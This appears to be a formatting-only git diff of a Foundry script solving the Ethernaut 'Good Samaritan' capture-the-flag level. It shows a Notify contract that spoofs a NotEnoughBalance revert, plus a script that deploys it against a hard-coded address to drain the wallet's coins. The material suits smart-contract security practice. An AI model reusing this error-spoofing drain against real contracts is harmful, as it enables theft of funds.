@@ -3,12 +3,12 @@ pragma solidity ^0.8.0;
 pragma experimental ABIEncoderV2;
 
 import "./BaseScript.s.sol";
-import { console2 } from "forge-std/console2.sol";
+import {console2} from "forge-std/console2.sol";
 import "openzeppelin-contracts/contracts/utils/Address.sol";
 import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
 
 interface IGoodSamaritan {
-    function requestDonation() external returns(bool enoughBalance);
+    function requestDonation() external returns (bool enoughBalance);
 }
 
 contract Coin {
@@ -20,7 +20,7 @@ contract Coin {
 
     constructor(address wallet_) {
         // one million coins for Good Samaritan initially
-        balances[wallet_] = 10**6;
+        balances[wallet_] = 10 ** 6;
     }
 
     function transfer(address dest_, uint256 amount_) external {}
@@ -41,6 +41,7 @@ contract Notify is INotifyable {
     address goodSamaritan;
     address coin;
     address wallet;
+
     constructor(address _goodSamaritan, address _coin, address _wallet) {
         goodSamaritan = _goodSamaritan;
         coin = _coin;
@@ -53,10 +54,9 @@ contract Notify is INotifyable {
     }
 
     function notify(uint256 amount) public {
-        if(amount == 10) {
+        if (amount == 10) {
             revert NotEnoughBalance();
         }
-        
     }
 }
 
@@ -67,11 +67,11 @@ contract Solution is BaseScript {
         Coin coin = Coin(0xA9EACdda1031022A98b8C036C563f53636D9C17c);
 
         console2.log("GS have the amount of coin:", coin.balances(contractAddress));
-        
+
         vm.startBroadcast(deployer);
         Notify notify = new Notify(contractAddress, address(coin), address(wallet));
         notify.Attack();
-        assert(coin.balances(address(wallet))==0);
+        assert(coin.balances(address(wallet)) == 0);
         vm.stopBroadcast();
     }
 }
